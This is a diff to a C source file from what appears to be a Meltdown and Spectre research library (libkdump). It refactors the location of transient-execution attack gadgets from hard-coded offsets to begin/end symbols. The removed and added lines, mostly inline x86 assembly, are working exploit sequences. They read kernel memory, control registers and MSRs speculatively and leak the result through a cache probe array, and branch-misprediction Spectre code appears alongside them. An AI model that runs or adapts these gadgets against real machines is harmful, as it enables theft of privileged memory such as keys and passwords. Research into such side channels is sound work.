@@ -67,23 +67,14 @@ static uint64_t ts = 0;
 #define MAX_MEASUREMENT 100
 #define MAX_WINDOW_SIZE 145
 
-#define CODE_SEQ_OFFSET 0xe
-#define MELTDOWN_STANDARD_ADDR_OFFSET 0x16
-#define MELTDOWN_STANDARD_LEN 0x12
-#define MELTDOWN_WRITE_ADDR_OFFSET 0x16
-#define MELTDOWN_WRITE_LEN 0x1a
-#define MELTDOWN_CR_ADDR_OFFSET 0x16
-#define MELTDOWN_CR_LEN 0x1d
-#define MELTDOWN_MSR_ADDR_OFFSET 0x16
-#define MELTDOWN_MSR_LEN 0x21
-#define MELTDOWN_XMM_ADDR_OFFSET 0x16
-#define MELTDOWN_XMM_LEN 0x20
-#define MELTDOWN_XMM_LOAD_ADDR_OFFSET 0x19
-#define MELTDOWN_XMM_LOAD_LEN 0x20
-#define MELTDOWN_XMM_WAIT_ADDR_OFFSET 0x19
-#define MELTDOWN_XMM_WAIT_LEN 0x20
-#define MELTDOWN_STANDARD_WITH_TSX_ADDR_OFFSET 0x19
-#define MELTDOWN_STANDARD_WITH_TSX_LEN 0X1d
+extern const char meltdown_depth_begin[], meltdown_depth_end[];
+extern const char meltdown_write_begin[], meltdown_write_end[];
+extern const char meltdown_cr_begin[], meltdown_cr_end[];
+extern const char meltdown_msr_begin[], meltdown_msr_end[];
+extern const char meltdown_xmm_begin[], meltdown_xmm_end[];
+extern const char meltdown_xmm_load_begin[], meltdown_xmm_load_end[];
+extern const char meltdown_xmm_wait_begin[], meltdown_xmm_wait_end[];
+extern const char meltdown_depth_with_tsx_begin[], meltdown_depth_with_tsx_end[];
 
 #ifdef __x86_64__
 
@@ -332,138 +323,9 @@ asm volatile("sub %%rbx, %%rcx\n"                                             \
 	: "c"(phys), "b"(mem)                                            \
 	: "rax", "rdx", "rdi", "rsi", "r8", "r9", "xmm0", "xmm1");
 
-// ---------------------------------------------------------------------------
-#define meltdown_write                                                          \
-asm volatile("mov %%rbx, %%rdi\n"                                             \
-	"sub $64, %%rdi\n"                                              \
-	"movq (%%rdi), %%rdi\n"                                         \
-	"movq $0x42000, (%%rcx)\n"                               \
-	"movq (%%rcx), %%rcx\n"                               \
-	"movq (%%rbx, %%rcx, 1), %%rcx\n"                                \
-	:                                                                \
-	: "c"(phys), "b"(mem)                                            \
-	: "rax", "rdx", "rdi", "rsi", "r8", "r9", "xmm0", "xmm1");
-
-// ---------------------------------------------------------------------------
-#define meltdown_cr                                                          \
-asm volatile("movq %%rbx, %%rdi\n"                                           \
-	"sub $64, %%rdi\n"                                              \
-	"movq (%%rdi), %%rdi\n"                                         \
-	"movq %%cr4, %%r8\n"                                            \
-	"and $0xff, %%r8\n"                                             \
-	"shl $12, %%r8\n"                                               \
-	"movq (%%rbx, %%r8, 1), %%r8\n"                                 \
-	:                                                                \
-	: "c"(phys), "b"(mem)                                            \
-	: "rax", "rdx", "rdi", "rsi", "r8", "r9", "xmm0", "xmm1");
-
-  // ---------------------------------------------------------------------------
-#define meltdown_msr                                                          \
-asm volatile("movq %%rbx, %%rdi\n"                                           \
-	"sub $64, %%rbx\n"                                              \
-	"movq $0x1a2, %%rcx\n"                                           \
-	"movq (%%rbx), %%rbx\n"                                         \
-	"rdmsr\n"                                                       \
-	"and $0xff0000, %%rax\n"                                             \
-	"shr $4, %%rax\n"                                               \
-	"movq (%%rdi, %%rax, 1), %%rax\n"                                 \
-	:                                                                \
-	: "c"(phys), "b"(mem)                                            \
-	: "rax", "rdx", "rdi", "rsi", "r8", "r9", "xmm0", "xmm1");
-
-// ---------------------------------------------------------------------------
-#define meltdown_xmm                                                          \
-asm volatile("movq %%rcx, %%rsi\n"                                           \
-	"movq %%rbx, %%rdi\n"                                           \
-	"sub %%rdi, %%rsi\n"                                            \
-	"sub $64, %%rdi\n"                                              \
-	"cpuid\n"                                                       \
-	"movq (%%rdi), %%rdi\n"                                         \
-	"movdqa (%%rsi, %%rdi, 1), %%xmm0\n"                            \
-	"movq %%xmm0, %%rax\n"                                          \
-	"movq (%%rdi,%%rax,1), %%rdi\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                                           \
-	: "rax", "xmm0", "rdi", "rsi", "r8");
-
-// ---------------------------------------------------------------------------
-#define meltdown_xmm_load                                                          \
-asm volatile("movq %%rbx, %%rsi\n"                                           \
-	"movq %%rbx, %%rdi\n"                                           \
-	"sub $64, %%rdi\n"                                              \
-	"cpuid\n"                                                       \
-	"movq (%%rdi), %%rdi\n"                                         \
-	"movq %%xmm0, %%rax\n"                                          \
-	"movq (%%rsi,%%rax,1), %%rsi\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                                           \
-	: "rax", "xmm0", "rdi", "rsi", "r8");
-
-// ---------------------------------------------------------------------------
-#define meltdown_xmm_wait                                                          \
-asm volatile("movq %%rbx, %%rsi\n"                                           \
-	"movq %%rbx, %%rdi\n"                                           \
-	"sub $64, %%rdi\n"                                              \
-	"cpuid\n"                                                       \
-	"movq (%%rdi), %%rdi\n"                                         \
-	"wait\n"                                                        \
-	"movq %%xmm0, %%rax\n"                                          \
-	"movq (%%rsi,%%rax,1), %%rsi\n"                                 \
-	:                                                               \
-	: "c"(phys), "b"(mem)                                           \
-	: "rax", "xmm0", "rdi", "rsi", "r8");
-
-// ---------------------------------------------------------------------------
-#define meltdown_depth_with_tsx                                                 \
-asm volatile("xbegin end_execution\n"                                         \
-	"sub %%rbx, %%rcx\n"                                             \
-	"sub $64, %%rbx\n"                                              \
-	"movq (%%rbx), %%rdi\n"                                         \
-	"movq (%%rdi, %%rcx, 1), %%rcx\n"                               \
-	"movq (%%rdi, %%rcx, 1), %%rcx\n"                                \
-	"xend\n"                                                        \
-	"end_execution:\n"                                              \
-	"nop\n"                                                         \
-	:                                                               \
-	: "c"(phys), "b"(mem)                                           \
-	: "rax", "xmm0", "rdi", "rsi", "r8");
-
 #ifndef MELTDOWN
 #define MELTDOWN meltdown_depth
 #endif
-
-// ---------------------------------------------------------------------------
-void dummy_meltdown_standard() {
-	meltdown_depth;
-}
-
-void dummy_meltdown_write() {
-	meltdown_write;
-}
-
-void dummy_meltdown_cr() {
-	meltdown_cr;
-}
-
-void dummy_meltdown_msr() {
-	meltdown_msr;
-}
-
-void dummy_meltdown_xmm() {
-	meltdown_xmm;
-}
-
-void dummy_meltdown_xmm_load() {
-	meltdown_xmm_load;
-}
-
-void dummy_meltdown_xmm_wait() {
-	meltdown_xmm_wait;
-}
-
-void dummy_meltdown_standard_with_tsx() {
-	meltdown_depth_with_tsx;
-}
 
 // ---------------------------------------------------------------------------
 typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
@@ -1390,7 +1252,8 @@ int libkdump_meltdown_pk_kernel(size_t legal_addr, int cache_level, int tlb_pres
 int __attribute__((optimize("-Os"), noinline)) libkdump_prefetch_read_signal_handler(size_t legal_addr, 
 	int cache_level, int tlb_present, int expected_data, size_t *code_seq_addr) {
 	if (code_seq_addr != NULL) {
-		*code_seq_addr = (size_t)&&CODE_SEQUENCE;
+		extern const char CODE_SEQUENCE[];
+		*code_seq_addr = (size_t)CODE_SEQUENCE;
 		return -1;
 	}
 
@@ -1414,9 +1277,176 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_prefetch_read_signal_han
 
 		flush(mem - 64);
 		if (!setjmp(buf)) {
-			CODE_SEQUENCE:
-			MELTDOWN;
-		// printf("no error\n");
+			asm volatile(
+				"CODE_SEQUENCE:\n"
+				"sub %%rbx, %%rcx\n"
+				"sub $64, %%rbx\n" 
+				"movq (%%rbx), %%rdi\n"
+				"movq (%%rdi, %%rcx, 1), %%rcx\n"
+				"movq (%%rdi, %%rcx, 1), %%rcx\n"
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				"add $1, %%rcx\n"  
+				"sub $1, %%rcx\n"  
+				: 
+				: "c"(phys), "b"(mem)
+				: "rax", "rdx", "rdi", "rsi", "r8", "r9", "xmm0", "xmm1");
 		}
 
 		i = expected_data;
@@ -1444,36 +1474,36 @@ void libkdump_select_code_sequence(int type, void *code_seq_addr) {
 	switch (type) {
 		case MELTDOWN_STANDARD:
 		case MELTDOWN_PK_USER:
-		base_addr = (size_t)dummy_meltdown_standard + MELTDOWN_STANDARD_ADDR_OFFSET;
-		code_len = MELTDOWN_STANDARD_LEN;
+		base_addr = (size_t)meltdown_depth_begin;
+		code_len = (size_t)meltdown_depth_end - (size_t)meltdown_depth_begin;
 		break;
 		case MELTDOWN_WRITE:
-		base_addr = (size_t)dummy_meltdown_write + MELTDOWN_WRITE_ADDR_OFFSET;
-		code_len = MELTDOWN_WRITE_LEN;
+		base_addr = (size_t)meltdown_write_begin;
+		code_len = (size_t)meltdown_write_end - (size_t)meltdown_write_begin;
 		break;
 		case MELTDOWN_CR:
-		base_addr = (size_t)dummy_meltdown_cr + MELTDOWN_CR_ADDR_OFFSET;
-		code_len = MELTDOWN_CR_LEN;
+		base_addr = (size_t)meltdown_cr_begin;
+		code_len = (size_t)meltdown_cr_end - (size_t)meltdown_cr_begin;
 		break;
 		case MELTDOWN_MSR:
-		base_addr = (size_t)dummy_meltdown_msr + MELTDOWN_MSR_ADDR_OFFSET;
-		code_len = MELTDOWN_MSR_LEN;
+		base_addr = (size_t)meltdown_msr_begin;
+		code_len = (size_t)meltdown_msr_end - (size_t)meltdown_msr_begin;
 		break;
 		case MELTDOWN_XMM:
-		base_addr = (size_t)dummy_meltdown_xmm + MELTDOWN_XMM_ADDR_OFFSET;
-		code_len = MELTDOWN_XMM_LEN;
+		base_addr = (size_t)meltdown_xmm_begin;
+		code_len = (size_t)meltdown_xmm_end - (size_t)meltdown_xmm_begin;
 		break;
 		case MELTDOWN_XMM_LOAD:
-		base_addr = (size_t)dummy_meltdown_xmm_load + MELTDOWN_XMM_LOAD_ADDR_OFFSET;
-		code_len = MELTDOWN_XMM_LOAD_LEN;
+		base_addr = (size_t)meltdown_xmm_load_begin;
+		code_len = (size_t)meltdown_xmm_load_end - (size_t)meltdown_xmm_load_begin;
 		break;
 		case MELTDOWN_XMM_WAIT:
-		base_addr = (size_t)dummy_meltdown_xmm_wait + MELTDOWN_XMM_WAIT_ADDR_OFFSET;
-		code_len = MELTDOWN_XMM_WAIT_LEN;
+		base_addr = (size_t)meltdown_xmm_wait_begin;
+		code_len = (size_t)meltdown_xmm_wait_end - (size_t)meltdown_xmm_wait_begin;
 		break;
 		case MELTDOWN_FORESHADOW:
-		base_addr = (size_t)dummy_meltdown_standard_with_tsx + MELTDOWN_STANDARD_WITH_TSX_ADDR_OFFSET;
-		code_len = MELTDOWN_STANDARD_WITH_TSX_LEN;
+		base_addr = (size_t)meltdown_depth_with_tsx_begin;
+		code_len = (size_t)meltdown_depth_with_tsx_end - (size_t)meltdown_depth_with_tsx_begin;
 		case MELTDOWN_PK_KERNEL:
 		default:
 		break;
@@ -1496,7 +1526,6 @@ int __attribute__((optimize("-O0"))) libkdump_window_measure(size_t addr, size_t
 
 	size_t code_seq_addr = 0;
 	libkdump_prefetch_read_signal_handler(0, 0, 0, 0, &code_seq_addr);
-	code_seq_addr += CODE_SEQ_OFFSET;
 	printf("code_seq_addr: 0x%lx\n", code_seq_addr);
 	assert(mprotect((void *)((code_seq_addr >> 12) << 12), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
 	libkdump_select_code_sequence(code_type, (void *)code_seq_addr);
@@ -1623,21 +1652,13 @@ int __attribute__((optimize("-O0"))) libkdump_prefetch_read(size_t addr, void *l
 #endif /* ifdef _MSC_VER */
 #include <immintrin.h>
 
-#define BRANCH_CODE_SEQ_OFFSET 0x34
-#define BRANCH_MELTDOWN_STANDARD_ADDR_OFFSET 0x4
-#define BRANCH_MELTDOWN_STANDARD_LEN 0x7
-#define BRANCH_MELTDOWN_CR_ADDR_OFFSET 0x4
-#define BRANCH_MELTDOWN_CR_LEN 0x13
-#define BRANCH_MELTDOWN_MSR_ADDR_OFFSET 0x4
-#define BRANCH_MELTDOWN_MSR_LEN 0x1a
-#define BRANCH_MELTDOWN_XMM_LOAD_ADDR_OFFSET 0x4
-#define BRANCH_MELTDOWN_XMM_LOAD_LEN 0x9
-#define BRANCH_MELTDOWN_XMM_WAIT_ADDR_OFFSET 0x4
-#define BRANCH_MELTDOWN_XMM_WAIT_LEN 0xa
+extern const char branch_meltdown_standard_begin[], branch_meltdown_standard_end[];
+extern const char branch_meltdown_cr_begin[], branch_meltdown_cr_end[];
+extern const char branch_meltdown_msr_begin[], branch_meltdown_msr_end[];
+extern const char branch_meltdown_xmm_load_begin[], branch_meltdown_xmm_load_end[];
+extern const char branch_meltdown_xmm_wait_begin[], branch_meltdown_xmm_wait_end[];
 
-#define ADD_INST_ADDR_OFFSET (BRANCH_MELTDOWN_STANDARD_ADDR_OFFSET+BRANCH_MELTDOWN_STANDARD_LEN)
 #define ADD_INST_LEN 4
-#define SUB_INST_ADDR_OFFSET (ADD_INST_ADDR_OFFSET+ADD_INST_LEN)
 #define SUB_INST_LEN 4
 #define COVERT_CHANNEL_INST_LEN 4
 
@@ -1648,86 +1669,25 @@ size_t *xp3 = NULL;
 size_t *xp4 = NULL;
 
 // ---------------------------------------------------------------------------
-#define branch_meltdown_standard                                       \
-asm volatile(                                                        \
-	"movq (%r11), %r11\n\t"                                        \
-	"movq (%r10, %r11, 1), %r11\n\t"                               \
-	"add $1, %r11\n\t"                                               \
-	"sub $1, %r11\n\t"                                               \
-	"nop\n\t");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_cr                                                          \
-asm volatile("movq %cr4, %r11\n"                                            \
-	"and $0xff, %r11\n"                                             \
-	"shl $12, %r11\n"                                               \
-	"movq (%r10, %r11, 1), %r11\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_msr                                                          \
-asm volatile("movq $0x1a2, %rcx\n"                                           \
-	"rdmsr\n"                                                       \
-	"and $0xff0000, %rax\n"                                             \
-	"shr $4, %rax\n"                                               \
-	"movq %rax, %r11\n"                                           \
-	"movq (%r10, %r11, 1), %r11\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_xmm_load                                                          \
-asm volatile("movq %xmm0, %r11\n"                                          \
-	"movq (%r10,%r11,1), %r11\n");
-
-// ---------------------------------------------------------------------------
-#define branch_meltdown_xmm_wait                                                          \
-asm volatile("wait\n"                                                        \
-	"movq %xmm0, %r11\n"                                          \
-	"movq (%r10,%r11,1), %r11\n");
-
-void dummy_branch_meltdown_standard()
-{
-	branch_meltdown_standard;
-}
-
-void dummy_branch_meltdown_cr()
-{
-	branch_meltdown_cr;
-}
-
-void dummy_branch_meltdown_msr()
-{
-	branch_meltdown_msr;
-}
-
-void dummy_branch_meltdown_xmm_load()
-{
-	branch_meltdown_xmm_load;
-}
-
-void dummy_branch_meltdown_xmm_wait()
-{
-	branch_meltdown_xmm_wait;
-}
-
-// ---------------------------------------------------------------------------
 void libkdump_insert_speculative_instruction(int code_type, int number, void *code_seq_addr) {
 	size_t base_addr = (size_t)code_seq_addr, from_addr;
 	size_t step_size, to_addr;
 
 	switch (code_type) {
 		case MELTDOWN_STANDARD:
-		to_addr = base_addr + BRANCH_MELTDOWN_STANDARD_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_standard_end - (size_t)branch_meltdown_standard_begin);
 		break;
 		case MELTDOWN_CR:
-		to_addr = base_addr + MELTDOWN_CR_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_cr_end - (size_t)branch_meltdown_cr_begin); //MELTDOWN_CR_LEN;
 		break;
 		case MELTDOWN_MSR:
-		to_addr = base_addr + MELTDOWN_MSR_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_msr_end - (size_t)branch_meltdown_msr_begin); //MELTDOWN_MSR_LEN;
 		break;
 		case MELTDOWN_XMM_LOAD:
-		to_addr = base_addr + MELTDOWN_XMM_LOAD_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_xmm_load_end - (size_t)branch_meltdown_xmm_load_begin); //MELTDOWN_XMM_LOAD_LEN;
 		break;
 		case MELTDOWN_XMM_WAIT:
-		to_addr = base_addr + MELTDOWN_XMM_WAIT_LEN;
+		to_addr = base_addr + ((size_t)branch_meltdown_xmm_wait_end - (size_t)branch_meltdown_xmm_wait_begin); //MELTDOWN_XMM_WAIT_LEN;
 		break;
 		default:
 		break;
@@ -1735,11 +1695,11 @@ void libkdump_insert_speculative_instruction(int code_type, int number, void *co
 
 	if ((number % 2) == 1) {
 		step_size = ADD_INST_LEN;
-		from_addr = (size_t)dummy_branch_meltdown_standard + ADD_INST_ADDR_OFFSET;
+		from_addr = (size_t)branch_meltdown_standard_end; // This is the addr of ADD instruction
 	}
 	else {
 		step_size = SUB_INST_LEN;
-		from_addr = (size_t)dummy_branch_meltdown_standard + SUB_INST_ADDR_OFFSET;
+		from_addr = (size_t)branch_meltdown_standard_end + ADD_INST_LEN; // This is the addr of SUB instruction
 	}
 
 	to_addr += (number+1)/2 * ADD_INST_LEN + number/2 * SUB_INST_LEN - COVERT_CHANNEL_INST_LEN;
@@ -1756,21 +1716,25 @@ void libkdump_select_branch_code_sequence(int type, void *code_seq_addr) {
 	size_t base_addr, code_len;
 	switch (type) {
 		case MELTDOWN_STANDARD:
-		base_addr = (size_t)dummy_branch_meltdown_standard + BRANCH_MELTDOWN_STANDARD_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_STANDARD_LEN;
+		base_addr = (size_t)branch_meltdown_standard_begin;
+		code_len = (size_t)branch_meltdown_standard_end - (size_t)branch_meltdown_standard_begin;
 		break;
 		case MELTDOWN_CR:
-		base_addr = (size_t)dummy_branch_meltdown_cr + BRANCH_MELTDOWN_CR_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_CR_LEN;
+		base_addr = (size_t)branch_meltdown_cr_begin;
+		code_len = (size_t)branch_meltdown_cr_end - (size_t)branch_meltdown_cr_begin;
+		break;
 		case MELTDOWN_MSR:
-		base_addr = (size_t)dummy_branch_meltdown_msr + BRANCH_MELTDOWN_MSR_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_MSR_LEN;
+		base_addr = (size_t)branch_meltdown_msr_begin;
+		code_len = (size_t)branch_meltdown_msr_end - (size_t)branch_meltdown_msr_begin;
+		break;
 		case MELTDOWN_XMM_LOAD:
-		base_addr = (size_t)dummy_branch_meltdown_xmm_load + BRANCH_MELTDOWN_XMM_LOAD_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_XMM_LOAD_LEN;
+		base_addr = (size_t)branch_meltdown_xmm_load_begin;
+		code_len = (size_t)branch_meltdown_xmm_load_end - (size_t)branch_meltdown_xmm_load_begin;
+		break;
 		case MELTDOWN_XMM_WAIT:
-		base_addr = (size_t)dummy_branch_meltdown_xmm_wait + BRANCH_MELTDOWN_XMM_WAIT_ADDR_OFFSET;
-		code_len = BRANCH_MELTDOWN_XMM_WAIT_LEN;
+		base_addr = (size_t)branch_meltdown_xmm_wait_begin;
+		code_len = (size_t)branch_meltdown_xmm_wait_end - (size_t)branch_meltdown_xmm_wait_begin;
+		break;
 		default:
 		break;
 	}
@@ -1791,7 +1755,8 @@ int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t 
 	int count[3] = {0, 0, 0};
 
 	if (code_seq_addr != NULL) {
-		*code_seq_addr = (size_t)&&BRANCH_CODE_SEQUENCE;
+		extern const char BRANCH_CODE_SEQUENCE[];
+		*code_seq_addr = (size_t)BRANCH_CODE_SEQUENCE;
 		return -1;
 	}
 
@@ -1837,6 +1802,7 @@ int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t 
 		//   "movq (%%r9), %%r9\n\t"
 		//   "cmp (%%r9), %%r8\n\t"
 		//   "jne TO_ADDR_END\n\t"
+				// "BRANCH_CODE_SEQUENCE:\n\t"
 		//   "TO_ADDR: movq (%%r11), %%r11\n\t"
 		//   "movq (%%r10, %%r11, 1), %%r11\n\t"
 		//   "movq (%%r10, %%rdx, 1), %%rdx\n\t"
@@ -1880,7 +1846,6 @@ int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t 
 
 		// option 2: exception after exception
 		if (!setjmp(buf)) {
-			BRANCH_CODE_SEQUENCE:
 			__asm__ volatile (
 				"mov %2, %%r11\n\t"
 				"mov %0, %%r10\n\t"
@@ -1892,6 +1857,7 @@ int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t 
 				"movq (%%r9), %%r9\n\t"
 				"movq (%%r9), %%r9\n\t"
 				"movq (%%r9), %%r9\n\t" // last movq is illegal
+				"BRANCH_CODE_SEQUENCE:\n\t"
 				"TO_ADDR: movq (%%r11), %%r11\n\t"
 				"movq (%%r10, %%r11, 1), %%r11\n\t"
 				"add $1, %%r11\n\t"
@@ -2045,7 +2011,6 @@ int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t 
 				);
 		}
 
-// BRANCH_CODE_SEQUENCE:
 		// // option 3: retpoline
 		// __asm__ volatile (
 		// // "mov %3, %%r8\n\t"
@@ -2060,6 +2025,7 @@ int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t 
 
 		// 	"call set_up_target\n\t"
 		// 	"movq (%%r9), %%r11\n\t"
+				// "BRANCH_CODE_SEQUENCE:\n\t"
 		// 	"movq (%%r11), %%r11\n\t"
 		// 	"add $1, %%r11\n\t"
 		// 	"sub $1, %%r11\n\t"
@@ -2288,7 +2254,6 @@ int libkdump_spectre_read(size_t training_x, size_t malicious_x, int score[2],
 
 	size_t code_seq_addr = 0;
 	readMemoryByte(0, 0, 0, 0, 0, 0, 0, 0, &code_seq_addr);
-	code_seq_addr += BRANCH_CODE_SEQ_OFFSET;
 	assert(mprotect((void *)((code_seq_addr >> 12) << 12), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
 	// should fix this function (a new function copying new instruction sequences, other than framework #1)
 	libkdump_select_branch_code_sequence(code_type, (void *)code_seq_addr);
